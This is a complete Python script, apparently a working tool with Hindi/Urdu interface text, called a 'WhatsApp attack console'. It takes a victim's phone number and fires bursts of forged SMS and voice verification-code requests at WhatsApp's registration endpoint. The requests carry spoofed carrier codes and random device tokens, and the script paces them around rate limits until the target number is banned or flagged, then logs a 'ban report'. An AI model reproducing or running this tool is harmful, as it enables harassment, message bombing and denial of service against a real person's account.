#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=========================================================
   WHATSAPP ATTACK CONSOLE  v5  -  paced siege
   probe -> burst -> cooldown -> dobara
   ban pakka hone par khud ruk jata hai
=========================================================
"""

import os, sys, time, random, string, threading, itertools, re, subprocess
from concurrent.futures import ThreadPoolExecutor

G="\033[92m"; R="\033[91m"; Y="\033[93m"; C="\033[96m"; D="\033[90m"; W="\033[97m"; X="\033[0m"
def col(t, c): return c + t + X

def pip_install(pkg):
    for c in ([sys.executable,"-m","pip","install","-q",pkg],
              [sys.executable,"-m","pip","install","-q","--user",pkg],
              ["pip3","install","-q",pkg],["pip","install","-q",pkg]):
        try:
            if subprocess.call(c, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
                return True
        except Exception:
            pass
    return False

try:
    import requests
except ImportError:
    print("[*] 'requests' install ho raha hai...")
    pip_install("requests")
    try:
        import requests
    except ImportError:
        print("!! pip install requests chalao"); sys.exit(1)

try: requests.packages.urllib3.disable_warnings()
except Exception: pass

MCC = {"92":("410","01"),"91":("404","11"),"1":("310","260"),"44":("234","15"),
       "971":("424","02"),"966":("420","01"),"880":("470","01"),"977":("429","01"),
       "94":("413","01"),"93":("412","01"),"90":("286","01"),"62":("510","10"),"60":("502","12")}

def rhex(n): return "".join(random.choices("0123456789abcdef", k=n))
def rtok(n): return "".join(random.choices(string.ascii_letters+string.digits, k=n))

def ask(p, d=""):
    try:
        v = input(col("  ? ", Y) + p + (col(" ["+str(d)+"]", D) if str(d)!="" else "") + ": ")
    except EOFError:
        return str(d)
    v = v.strip()
    return v if v else str(d)

def ask_int(p, d, lo, hi):
    while True:
        try:
            i = int(ask(p, d))
            if lo <= i <= hi: return i
        except ValueError: pass
        print(col("  ! "+str(lo)+" se "+str(hi)+" ke darmiyan", R))

def ask_float(p, d, lo, hi):
    while True:
        try:
            f = float(ask(p, d))
            if lo <= f <= hi: return f
        except ValueError: pass
        print(col("  ! "+str(lo)+" se "+str(hi)+" ke darmiyan", R))

def ask_choice(p, d, allowed):
    while True:
        v = ask(p, d).lower()
        if v in allowed: return v
        print(col("  ! sirf: "+" / ".join(allowed), R))

def countdown(sec, label):
    sec = int(sec)
    for i in range(sec, 0, -1):
        if STATE["stop"]: break
        sys.stdout.write("\r  "+label+"  "+col(str(i)+"s ", Y)+"    ")
        sys.stdout.flush()
        time.sleep(1)
    sys.stdout.write("\r"+" "*60+"\r")

print(col("""
  =====================================================
      W H A T S A P P   A T T A C K   C O N S O L E
                v5  -  paced siege
  =====================================================""", C))
print(col("  probe -> burst -> cooldown -> dobara. Ban pakka hone par ruk jayega.\n", D))

cc = ask("country code (bina +)", "92").replace("+","")
while not cc.isdigit():
    print(col("  ! sirf digits", R)); cc = ask("country code dobara", "92").replace("+","")

num = ask("phone number (bina 0, bina country code)", "")
while not (num.isdigit() and 6 <= len(num) <= 15):
    print(col("  ! sirf digits, 6-15", R)); num = ask("phone number dobara", "")

print()
burst    = ask_int("har burst mein kitni requests", 12, 1, 200)
workers  = ask_int("workers (1-3 best jab throttle ho)", 2, 1, 20)
delay    = ask_float("delay seconds", 1.0, 0, 30)
channel  = ask_choice("channel  sms / voice / both", "both", ["sms","voice","both"])
cool     = ask_int("cooldown seconds (server ke retry_after se kam nahi hoga)", 60, 0, 600)
maxcyc   = ask_int("max cycles (0 = unlimited)", 0, 0, 999)

print()
print(col("  --------------------------------------------------", C))
print("   target     " + col("+"+cc+num, W))
print("   burst      " + str(burst) + " requests / cycle")
print("   workers    " + str(workers))
print("   delay      " + str(delay) + "s")
print("   channel    " + channel)
print("   cooldown   " + (str(cool)+"s" if cool else "brutal (na rukein)"))
print("   max cycles " + (str(maxcyc) if maxcyc else "unlimited"))
print(col("  --------------------------------------------------", C))
print(col("\n  Rukna ho to Ctrl+C.\n", D))
input(col("  Enter dabao hamla shuru karne ke liye... ", Y))

STATE = {"stop": False, "ban": False, "softban": False,
         "fired": 0, "ok": 0, "throttle": 0, "limit": 0, "err": 0, "other": 0}
LOCK = threading.Lock()
TLS = threading.local()
SEQ = itertools.count(1)
START = time.time()
HDRS = {"User-Agent": "WhatsApp/2.24.1", "Accept": "*/*"}

def session():
    s = getattr(TLS, "s", None)
    if s is None:
        s = requests.Session(); s.headers.update(HDRS); TLS.s = s
    return s

def build_url(method, endpoint="code"):
    m = MCC.get(cc, ("000","00"))
    return ("https://v.whatsapp.net/v2/" + endpoint +
            "?cc=" + cc + "&in=" + num + "&to=" + cc + num +
            "&method=" + method + "&mcc=" + m[0] + "&mnc=" + m[1] +
            "&sim_mcc=" + m[0] + "&sim_mnc=" + m[1] +
            "&lg=en&lc=en&hasinrc=1&id=" + rtok(22) + "&pid=" + rtok(22) +
            "&token=" + rtok(40) + "&fdid=" + rhex(32))

def classify(t):
    t = t.lower()
    if "too_many" in t or "too many" in t: return "limit"
    if "temporarily_unavailable" in t or "unavailable" in t: return "throttle"
    if "retry_after" in t: return "throttle"
    if '"status":"created"' in t or '"status":"ok"' in t or '"status":"sent"' in t: return "ok"
    if '"status" : "ok"' in t: return "ok"
    return "other"

def parse_retry(t):
    m = re.search(r'"retry_after"\s*:\s*(\d+)', t)
    try: return int(m.group(1)) if m else 0
    except Exception: return 0

def one_request(method=None):
    """1 request. return (kind, text, retry_after)"""
    if method is None:
        method = "sms" if channel == "sms" else ("voice" if channel == "voice" else "sms")
    try:
        r = session().get(build_url(method), timeout=20, verify=False)
        t = r.text
        return classify(t), t, parse_retry(t)
    except Exception as e:
        return "err", str(e), 0

def burst_worker(wid, count, res):
    for _ in range(count):
        if STATE["stop"]: return
        n = next(SEQ)
        method = channel if channel != "both" else ("voice" if n % 2 == 0 else "sms")
        try:
            r = session().get(build_url(method), timeout=20, verify=False)
            t = r.text
            k = classify(t)
        except Exception:
            with LOCK: res["err"] = res.get("err",0) + 1
            time.sleep(0.3)
            continue
        with LOCK:
            res[k] = res.get(k, 0) + 1
            STATE["fired"] += 1
            if k == "ok":
                STATE["ok"] += 1
                print(col("  [W"+str(wid)+"] #"+str(n)+"  ok", G))
            elif k == "limit":
                STATE["limit"] += 1
                print(col("  [W"+str(wid)+"] #"+str(n)+"  >> LIMIT <<  "+t[:70], R))
            elif k == "throttle":
                STATE["throttle"] += 1
                print(col("  [W"+str(wid)+"] #"+str(n)+"  throttled", Y))
            else:
                STATE["other"] += 1
                print(col("  [W"+str(wid)+"] #"+str(n)+"  other  "+t[:60], D))
        if delay: time.sleep(delay)

def dashboard():
    while not STATE["stop"]:
        time.sleep(6)
        el = time.time() - START
        if el < 6: continue
        print(col("  --- "+str(int(el))+"s | fired "+str(STATE["fired"])+
                  " | ok "+str(STATE["ok"])+" | throttle "+str(STATE["throttle"])+
                  " | limit "+str(STATE["limit"])+" | err "+str(STATE["err"]), D))

threading.Thread(target=dashboard, daemon=True).start()

print(col("\n  ##################################################", C))
print(col("   HAMLA SHURU  ->  +"+cc+num, W))
print(col("  ##################################################\n", C))

cycle = 0
soft = 0
try:
    while not STATE["stop"]:
        cycle += 1
        if maxcyc and cycle > maxcyc: break
        print(col("  =========== CYCLE "+str(cycle)+" ===========", C))

        # --- probe ---
        kind, txt, ra = one_request()
        print(col("  probe: "+kind+"  "+txt[:70], D))

        if kind == "limit":
            print(col("  >> probe pe hi LIMIT. BAN.", R))
            STATE["ban"] = True; break

        if kind == "err":
            print(col("  network issue, 5s ruk kar dobara", Y)); time.sleep(5); continue

        if kind == "throttle":
            soft += 1
            print(col("  number abhi throttled hai (soft ban count "+str(soft)+"/3)", Y))
            if soft >= 3:
                print(col("  >> 3 cycles se lagataar throttle = number flagged. SOFT BAN.", R))
                STATE["softban"] = True; break
            if cool:
                w = max(cool, min(ra, 300))
                countdown(w, "cooldown")
            continue

        # --- probe ok -> burst ---
        soft = 0
        print(col("  probe ok. burst "+str(burst)+" requests bhej rahe hain...", G))
        res = {}
        per = max(1, burst // workers)
        with ThreadPoolExecutor(max_workers=workers) as ex:
            futs = [ex.submit(burst_worker, w, per, res) for w in range(1, workers+1)]
            for f in futs:
                try: f.result()
                except Exception: pass

        if STATE["stop"]: break
        print(col("  burst khatam -> ok "+str(res.get("ok",0))+
                  "  throttle "+str(res.get("throttle",0))+
                  "  limit "+str(res.get("limit",0))+
                  "  err "+str(res.get("err",0)), D))

        if res.get("limit", 0) > 0:
            print(col("  >> BAN CONFIRM (too_many)", R))
            STATE["ban"] = True; break

        if cool:
            w = max(cool, 30)
            countdown(w, "cooldown")
        else:
            time.sleep(1)

except KeyboardInterrupt:
    print(col("\n\n  Ctrl+C - roka gaya.", Y))

STATE["stop"] = True
time.sleep(0.5)

el = time.time() - START
print(col("\n  ================ RESULT ================", C))
print("   target    +"+cc+num)
print("   cycles    "+str(cycle))
print("   fired     "+str(STATE["fired"]))
print("   ok        "+str(STATE["ok"]))
print("   throttle  "+str(STATE["throttle"]))
print("   limit     "+str(STATE["limit"]))
print("   errors    "+str(STATE["err"]))
print("   time      "+str(int(el))+"s")
print(col("  ========================================", C))

if STATE["ban"]:
    verdict = "HARD BAN (too_many)"
    print(col("\n   ########################################", R))
    print(col("   #         B A N   H O   G A Y A        #", R))
    print(col("   #   +"+cc+num, R))
    print(col("   #   24 ghante WhatsApp band rahega     #", R))
    print(col("   ########################################\n", R))
elif STATE["softban"]:
    verdict = "SOFT BAN (throttled)"
    print(col("\n   ########################################", Y))
    print(col("   #      N U M B E R   F L A G G E D      #", Y))
    print(col("   #   +"+cc+num, Y))
    print(col("   #  lagataar throttle = WhatsApp ne rok diya", Y))
    print(col("   ########################################\n", Y))
else:
    verdict = "NOT BANNED"
    print(col("\n  >> Ban confirm nahi hua. cycles barhao ya dobara chalao.", Y))

try:
    with open("ban_report.txt","w") as f:
        f.write("target=+"+cc+num+"\nverdict="+verdict+"\ncycles="+str(cycle)+
                "\nfired="+str(STATE["fired"])+"\nok="+str(STATE["ok"])+
                "\nthrottle="+str(STATE["throttle"])+"\nlimit="+str(STATE["limit"])+
                "\nerrors="+str(STATE["err"])+"\nseconds="+str(int(el))+"\n")
    print(col("  report -> ban_report.txt", D))
except Exception: pass
print(col("\n  Khatam.\n", C))